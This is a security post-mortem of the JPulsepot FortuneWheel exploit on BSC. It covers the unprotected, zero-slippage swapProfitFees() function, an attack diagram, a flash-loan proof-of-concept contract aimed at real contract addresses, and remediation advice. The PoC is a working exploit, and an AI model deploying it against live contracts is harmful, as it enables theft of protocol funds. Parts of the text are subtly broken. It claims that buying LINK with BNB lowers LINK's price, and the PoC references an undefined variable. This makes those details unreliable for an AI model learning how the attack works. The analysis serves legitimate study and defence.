# JPulsepot — Profit Fee Swap Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-13 |
| **Protocol** | JPulsepot (FortuneWheel) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$21,500 |
| **Attacker** | [0xf1e73123...](https://bscscan.com/address/0xf1e73123594cb0f3655d40e4dd6bde41fa8806e8) |
| **Attack Tx** | [0xd6ba15ec...](https://bscscan.com/tx/0xd6ba15ecf3df9aaae37450df8f79233267af41535793ee1f69c565b50e28f7da) |
| **Vulnerable Contract** | [0x384b9fb6...](https://bscscan.com/address/0x384b9fb6E42dab87F3023D87ea1575499A69998E) |
| **Root Cause** | `swapProfitFees()` is publicly callable, allowing price manipulation at swap time to misappropriate protocol revenue |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/JPulsepot_exp.sol) |

---

## 1. Vulnerability Overview

The JPulsepot FortuneWheel contract (`0x384b9fb6`) declares `swapProfitFees()` — a function that exchanges accumulated profit fees into LINK tokens — as externally callable. The attacker borrowed 4,300 BNB via a PancakeSwap V3 flash loan, performed a large BNB→LINK swap to suppress the LINK price, then called `swapProfitFees()` to force the protocol to exchange its fees at the manipulated, unfavorable price.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: fee swap function callable by anyone
function swapProfitFees() external {
    // Swaps at current market price at call time — vulnerable to price manipulation
    uint256 bnbBalance = address(this).balance;
    IRouter(router).swapExactETHForTokens{value: bnbBalance}(
        0,          // No minimum output — no slippage protection
        [WBNB, LINK],
        address(this),
        block.timestamp
    );
}

// ✅ Safe code: access control + slippage protection
function swapProfitFees() external onlyOwner {
    uint256 bnbBalance = address(this).balance;
    uint256 expectedOut = getExpectedOutput(bnbBalance); // TWAP-based
    uint256 minOut = expectedOut * 95 / 100; // 5% slippage tolerance
    IRouter(router).swapExactETHForTokens{value: bnbBalance}(
        minOut, [WBNB, LINK], address(this), block.timestamp
    );
}
```

### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 56) — FortuneWheel 0x384b9fb6E42dab87F3023D87ea1575499A69998E

The real `swapProfitFees()` is considerably more complex than the simplified reconstruction, but retains the critical flaws: it is `external` with no access-control modifier, and every internal swap to ETH or tokens uses `0` as the minimum output (`amountOutMin = 0`).

```solidity
// Source: Etherscan-verified — FortuneWheel (0x384b9fb6E42dab87F3023D87ea1575499A69998E, BSC)

function swapProfitFees() external { // ❌ No access control — callable by anyone
    IPancakeRouter02 router = IPancakeRouter02(pancakeRouterAddr);
    address[] memory path = new address[](2);
    uint256 totalBNBForGame;
    uint256 totalBNBForLink;
    uint256 length = casinoCount;
    uint256 BNBPPool = 0;

    // Swap each token to BNB
    for (uint256 i = 1; i <= length; ++i) {
        Casino memory casinoInfo = tokenIdToCasino[i];
        IERC20 token = IERC20(casinoInfo.tokenAddress);

        if (casinoInfo.liquidity == 0) continue;

        uint256 availableProfit = casinoInfo.profit < 0 ? 0 : uint256(casinoInfo.profit);
        if (casinoInfo.liquidity < availableProfit) {
            availableProfit = casinoInfo.liquidity;
        }

        uint256 gameFee = (availableProfit * casinoInfo.fee) / 100;
        uint256 amountForLinkFee = getTokenAmountForLink(casinoInfo.tokenAddress, linkSpent[i]);
        _updateProfitInfo(i, uint256(gameFee), availableProfit);
        casinoInfo.liquidity = tokenIdToCasino[i].liquidity;

        if (gameFee < amountForLinkFee) {
            if (casinoInfo.liquidity < (amountForLinkFee - gameFee)) {
                amountForLinkFee = gameFee + casinoInfo.liquidity;
                tokenIdToCasino[i].liquidity = 0;
            } else {
                tokenIdToCasino[i].liquidity -= (amountForLinkFee - gameFee);
            }
            gameFee = 0;
        } else {
            gameFee -= amountForLinkFee;
        }

        _updateLinkConsumptionInfo(i, amountForLinkFee);

        if (casinoInfo.tokenAddress == address(0)) {
            totalBNBForGame += gameFee;
            totalBNBForLink += amountForLinkFee;
            continue;
        }
        if (casinoInfo.tokenAddress == BNBPAddress) {
            BNBPPool += gameFee;
            gameFee = 0;
        }

        path[0] = casinoInfo.tokenAddress;
        path[1] = wbnbAddr;

        if (gameFee + amountForLinkFee == 0) {
            continue;
        }
        token.approve(address(router), gameFee + amountForLinkFee);
        uint256[] memory swappedAmounts = router.swapExactTokensForETH(
            gameFee + amountForLinkFee,
            0, // ❌ amountOutMin = 0 — no slippage protection
            path,
            address(this),
            block.timestamp
        );
        totalBNBForGame += (swappedAmounts[1] * gameFee) / (gameFee + amountForLinkFee);
        totalBNBForLink += (swappedAmounts[1] * amountForLinkFee) / (gameFee + amountForLinkFee);
    }

    path[0] = wbnbAddr;
    // Convert to LINK
    if (totalBNBForLink > 0) {
        path[1] = linkTokenAddr;

        uint256 linkAmount = router.swapExactETHForTokens{ value: totalBNBForLink }(
            0, // ❌ amountOutMin = 0 — accepts any price, fully vulnerable to sandwich
            path,
            address(this),
            block.timestamp
        )[1];

        IERC20(linkTokenAddr).approve(pegSwapAddr, linkAmount);
        PegSwap(pegSwapAddr).swap(linkAmount, linkTokenAddr, link677TokenAddr);

        LinkTokenInterface(link677TokenAddr).transferAndCall(
            coordinatorAddr,
            linkAmount,
            abi.encode(subscriptionId)
        );
        emit SuppliedLink(linkAmount);
    }

    if (totalBNBForGame > 0) {
        path[1] = BNBPAddress;
        BNBPPool += router.swapExactETHForTokens{ value: totalBNBForGame }(
            0, // ❌ amountOutMin = 0
            path, address(this), block.timestamp)[1];
    }

    if (BNBPPool > 0) {
        IERC20(BNBPAddress).approve(potAddress, BNBPPool);
        IPotLottery(potAddress).addAdminTokenValue(BNBPPool);

        emit SuppliedBNBP(BNBPPool);
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `swapProfitFees()` has no `onlyOwner` or access-control modifier — any EOA or contract can call it at any time.
- Every `swapExactTokensForETH` and `swapExactETHForTokens` call inside uses `0` as `amountOutMin`, meaning the protocol accepts any output amount, no matter how unfavorable the price.
- An attacker can call this inside a flash-loan callback after first purchasing a large amount of LINK (suppressing the BNB/LINK rate), forcing the protocol to swap BNB for LINK at a deeply unfavorable price. The attacker then reverses the trade for profit.

```solidity
// ✅ Fix:
function swapProfitFees() external onlyOwner { // ✅ restrict to owner
    uint256 bnbBalance = address(this).balance;
    uint256 minOut = getTWAPBasedMinOut(bnbBalance); // ✅ TWAP-based minimum
    address[] memory path = new address[](2);
    path[0] = WBNB;
    path[1] = LINK;
    IUniswapV2Router(router).swapExactETHForTokens{value: bnbBalance}(
        minOut, path, address(this), block.timestamp
    );
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan 4,300 BNB from PancakeSwap V3
  │
  ├─→ [2] Large BNB → LINK swap
  │         └─ LINK price drops (in BNB terms)
  │
  ├─→ [3] Call FortuneWheel.swapProfitFees()
  │         └─ Protocol forced to swap BNB → LINK at depressed price
  │            (takes a loss at attacker-manipulated price)
  │
  ├─→ [4] Reverse swap: held LINK → BNB
  │         └─ Price normalizes, attacker realizes profit
  │
  ├─→ [5] Repay flash loan (4,300 BNB + fee)
  │
  └─→ [6] ~$21,500 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Actual PoC code (based on code confirmed in DeFiHackLabs)

contract JPulsepot is BaseTestWithBalanceLog {
    address constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address constant BNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;
    address constant victim = 0x384b9fb6E42dab87F3023D87ea1575499A69998E;

    function testExploit() public balanceLog {
        // [1] PancakeSwap V3 flash loan: 4,300 BNB
        IPancakeV3Pool(PancakeV3Pool).flash(
            address(this), 0, 4_300_000_000_000_000_000_000, abi.encode(amount1)
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));
        IERC20(BNB).approve(PancakeV2Router, type(uint256).max);

        // [2] Large BNB → LINK swap (LINK price drops)
        address[] memory path = new address[](2);
        path[0] = BNB; path[1] = LINK;
        IUniswapV2Router(payable(PancakeV2Router))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount, 0, path, address(this), block.timestamp
            );

        // [3] Force fee swap on victim contract
        // Protocol exchanges BNB at the manipulated LINK price
        IFortuneWheel(victim).swapProfitFees();

        // [4] Reverse swap LINK → BNB (realize profit)
        IERC20(LINK).approve(PancakeV2Router, type(uint256).max);
        path[0] = LINK; path[1] = BNB;
        IUniswapV2Router(payable(PancakeV2Router))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(LINK).balanceOf(address(this)), 0, path, address(this), block.timestamp
            );

        // [5] Repay flash loan
        IERC20(BNB).transfer(msg.sender, amount + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + Sandwich Price Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (flash loan-based price manipulation) |
| **DApp Category** | Revenue distribution / lottery protocol |
| **Impact** | Misappropriation of protocol revenue |

## 6. Remediation Recommendations

1. **Access Control**: Restrict `swapProfitFees()` so it can only be called by `onlyOwner` or a whitelisted address
2. **Slippage Protection**: Set a TWAP-based minimum output amount (`amountOutMin`) for swaps
3. **Prevent Manual Triggering**: Remove externally triggerable swap functions; move logic to internal execution
4. **Price Manipulation Detection**: Block swaps when the spot price deviates beyond a threshold from the TWAP

## 7. Lessons Learned

- Functions that modify internal protocol state must only be callable by trusted parties.
- A "sandwich attack" is a classic MEV technique that places swaps before and after a target transaction; any externally callable swap function is permanently exposed to this attack.
- Zero slippage (`amountOutMin=0`) is a primary factor that maximizes losses in price manipulation attacks and must never be permitted.